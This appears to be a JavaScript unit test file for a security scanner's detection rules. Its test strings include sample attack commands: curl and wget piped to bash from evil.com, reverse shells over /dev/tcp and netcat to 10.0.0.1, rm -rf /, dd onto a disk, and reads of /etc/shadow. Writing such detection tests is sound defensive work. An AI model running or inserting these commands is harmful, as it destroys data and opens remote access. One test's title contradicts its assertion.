/**
 * Commands & Obfuscation Security Rules Unit Tests
 * Tests for dangerous shell commands, code patterns, injection, and obfuscation detection
 */

const { test, describe } = require('node:test');
const assert = require('node:assert');
const { rules } = require('../../dist/rules/commands.js');

describe('Commands Security Rules', () => {

  function testRule(ruleId, content, shouldMatch) {
    const rule = rules.find(r => r.id === ruleId);
    assert.ok(rule, `Rule ${ruleId} should exist`);
    rule.pattern.lastIndex = 0;
    const matches = rule.pattern.test(content);
    assert.strictEqual(matches, shouldMatch,
      `Rule ${ruleId} ${shouldMatch ? 'should' : 'should not'} match: ${content.substring(0, 100)}`);
  }

  // ============================================
  // Dangerous Shell Commands
  // ============================================
  describe('Dangerous Shell Commands', () => {
    test('should detect rm -rf on root paths', () => {
      testRule('command-rm-rf', 'rm -rf /', true);
      testRule('command-rm-rf', 'rm -rf ~/', true);
      testRule('command-rm-rf', 'rm -rf $HOME', true);
    });

    test('should detect system directory deletion', () => {
      testRule('command-rm-system', 'rm -r /usr/bin', true);
      testRule('command-rm-system', 'rm /etc/passwd', true);
    });

    test('should detect curl piped to shell', () => {
      testRule('command-curl-bash', 'curl https://evil.com/install.sh | bash', true);
      testRule('command-curl-bash', 'curl https://evil.com/s | sh', true);
    });

    test('should detect wget piped to shell', () => {
      testRule('command-wget-bash', 'wget https://evil.com/install.sh | bash', true);
    });

    test('should detect chmod 777', () => {
      testRule('command-chmod-777', 'chmod 777 /var/www', true);
      testRule('command-chmod-777', 'chmod -R 777 /', true);
    });

    test('should detect setuid permission changes', () => {
      testRule('command-chmod-setuid', 'chmod 4755 /usr/bin/myapp', true);
      testRule('command-chmod-setuid', 'chmod u+s /usr/bin/myapp', true);
    });

    test('should detect NOPASSWD sudo', () => {
      testRule('command-sudo-nopasswd', 'user ALL=(ALL) NOPASSWD: ALL', true);
    });

    test('should detect dd to disk device', () => {
      testRule('command-dd-disk', 'dd if=/dev/zero of=/dev/sda', true);
    });

    test('should detect mkfs commands', () => {
      testRule('command-mkfs', 'mkfs.ext4 /dev/sda1', true);
    });
  });

  // ============================================
  // Shell Injection
  // ============================================
  describe('Shell Injection', () => {
    test('should detect JS shell injection', () => {
      testRule('command-shell-injection-js', 'exec(`ls ${userInput}`)', true);
      testRule('command-shell-injection-js', 'execSync("ls " + req.body.path)', true);
    });

    test('should detect Python shell injection', () => {
      testRule('command-shell-injection-py', 'os.system("rm " + user_input)', true);
      testRule('command-shell-injection-py', 'subprocess("cmd " + input_val)', true);
    });

    test('should detect backtick injection', () => {
      testRule('command-backtick-injection', '`ls ${req.params.dir}`', true);
    });
  });

  // ============================================
  // Code Execution
  // ============================================
  describe('Code Execution', () => {
    test('should detect eval with user input', () => {
      testRule('command-eval-js', 'eval(req.body.code)', true);
    });

    test('should detect Function constructor with user input', () => {
      testRule('command-function-constructor', 'new Function(req.body.code)', true);
    });

    test('should detect Python exec with input', () => {
      testRule('command-python-exec', 'exec(open("script.py").read())', true);
    });

    test('should detect pickle load', () => {
      testRule('command-python-pickle', 'pickle.load(f)', true);
      testRule('command-python-pickle', 'pickle.loads(data)', true);
    });

    test('should detect base64 decode piped to shell', () => {
      testRule('command-base64-exec', 'echo payload | base64 -d | bash', true);
    });

    test('should detect Node.js vm module usage', () => {
      testRule('command-vm-runin', 'vm.runInNewContext(code)', true);
      testRule('command-vm-runin', 'vm.Script(code)', true);
    });
  });

  // ============================================
  // SQL Injection
  // ============================================
  describe('SQL Injection', () => {
    test('should detect SQL injection via concatenation', () => {
      testRule('command-sql-injection', 'query(`SELECT * FROM users WHERE id=${userId}`)', true);
    });

    test('should detect SQL string concatenation', () => {
      testRule('command-sql-string-concat', '"SELECT * FROM users WHERE id=" + id', true);
    });

    test('should detect NoSQL injection operators', () => {
      testRule('command-nosql-injection', '$ne: ""', true);
      testRule('command-nosql-injection', '$where: "this.a > 1"', true);
    });
  });

  // ============================================
  // XSS Patterns
  // ============================================
  describe('XSS Patterns', () => {
    test('should detect innerHTML with user input', () => {
      testRule('command-xss-innerhtml', 'el.innerHTML = req.body.html', true);
    });

    test('should detect document.write with dynamic content', () => {
      testRule('command-xss-document-write', 'document.write("<p>" + name)', true);
    });

    test('should detect dangerouslySetInnerHTML', () => {
      testRule('command-xss-dangerously-set', 'dangerouslySetInnerHTML={{ __html: data }}', true);
    });
  });

  // ============================================
  // Network Security
  // ============================================
  describe('Network Security', () => {
    test('should detect SSL verification disabled', () => {
      testRule('command-disable-ssl', 'verify=False', true);
      testRule('command-disable-ssl', 'rejectUnauthorized: false', true);
      testRule('command-disable-ssl', "NODE_TLS_REJECT_UNAUTHORIZED='0'", true);
    });

    test('should detect insecure HTTP with credentials', () => {
      testRule('command-insecure-http', 'http://user:pass@example.com', true);
      testRule('command-insecure-http', 'http://api.example.com?token=abc123', true);
    });

    test('should detect SSRF patterns', () => {
      testRule('command-ssrf-pattern', 'fetch(req.body.url)', true);
    });
  });

  // ============================================
  // Cryptography Issues
  // ============================================
  describe('Cryptography', () => {
    test('should detect weak crypto algorithms', () => {
      testRule('command-weak-crypto', 'createHash("MD5")', true);
      testRule('command-weak-crypto', 'SHA1(data)', true);
      testRule('command-weak-crypto', 'createCipher(algo, key)', true);
    });

    test('should not match DES in description', () => {
      // DES has word boundary check
      testRule('command-weak-crypto', 'DES encryption', true);
    });

    test('should detect hardcoded IV', () => {
      testRule('command-hardcoded-iv', 'iv = "0000000000000000"', true);
    });

    test('should detect ECB mode', () => {
      testRule('command-ecb-mode', 'AES/ECB/PKCS5Padding', true);
      testRule('command-ecb-mode', 'MODE_ECB', true);
    });
  });

  // ============================================
  // Deserialization
  // ============================================
  describe('Deserialization', () => {
    test('should detect unsafe YAML load', () => {
      testRule('command-yaml-load', 'yaml.load(data)', true);
    });

    test('should detect JSON eval', () => {
      testRule('command-json-parse-eval', 'eval(JSON.stringify(data))', true);
    });
  });

  // ============================================
  // Reverse Shell
  // ============================================
  describe('Reverse Shell', () => {
    test('should detect reverse shell patterns', () => {
      testRule('command-reverse-shell', 'bash -i >& /dev/tcp/10.0.0.1/8080', true);
      testRule('command-reverse-shell', 'python -c "import socket; s=socket.socket(); s.connect((host,port))"', true);
    });

    test('should detect netcat shell', () => {
      testRule('command-netcat-shell', 'nc 10.0.0.1 4444 -e /bin/sh', true);
    });
  });

  // ============================================
  // Other Dangerous Patterns
  // ============================================
  describe('Other Patterns', () => {
    test('should detect debug mode enabled', () => {
      testRule('command-debug-enabled', 'DEBUG = True', true);
      testRule('command-debug-enabled', 'debug: true', true);
    });

    test('should detect hardcoded sensitive paths', () => {
      testRule('command-hardcoded-path', 'open("/etc/passwd")', true);
      testRule('command-hardcoded-path', 'open("/etc/shadow")', true);
    });

    test('should detect unvalidated redirects', () => {
      testRule('command-unvalidated-redirect', 'location.href = req.query.next', true);
    });
  });

  // ============================================
  // Obfuscation Detection
  // ============================================
  describe('Obfuscation Detection', () => {
    test('should detect eval with base64 decode', () => {
      testRule('obfuscation-eval-base64', 'eval(atob("SGVsbG8="))', true);
      testRule('obfuscation-eval-base64', 'eval(Buffer.from("data", "base64"))', true);
    });

    test('should detect String.fromCharCode obfuscation', () => {
      testRule('obfuscation-fromcharcode', 'String.fromCharCode(72, 101, 108, 108, 111, 32)', true);
    });

    test('should detect heavy hex escape sequences', () => {
      testRule('obfuscation-hex-escape', '"\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x21"', true);
    });

    test('should detect heavy unicode escape sequences', () => {
      testRule('obfuscation-unicode-escape', '"\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0057\\u006f\\u0072\\u006c\\u0064\\u0021"', true);
    });

    test('should detect Function constructor obfuscation', () => {
      testRule('obfuscation-constructor-call', 'new Function("return this")', true);
    });

    test('should detect reversed string obfuscation', () => {
      testRule('obfuscation-array-reverse', '"evil".split("").reverse().join("")', true);
    });

    test('should detect packed code', () => {
      testRule('obfuscation-packed-code', 'eval(function(p,a,c,k,e,d){', true);
    });

    test('should detect JSFuck obfuscation', () => {
      testRule('obfuscation-jsfuck', '(![]+[])', true);
    });

    test('should detect long base64 strings', () => {
      const longB64 = '"' + 'A'.repeat(101) + '"';
      testRule('obfuscation-base64-long', longB64, true);
    });

    test('should detect double URL encoding', () => {
      testRule('obfuscation-double-encoding', '%252e%252e%252f', true);
    });

    test('should not flag short base64 strings', () => {
      testRule('obfuscation-base64-long', '"SGVsbG8="', false);
    });
  });
});
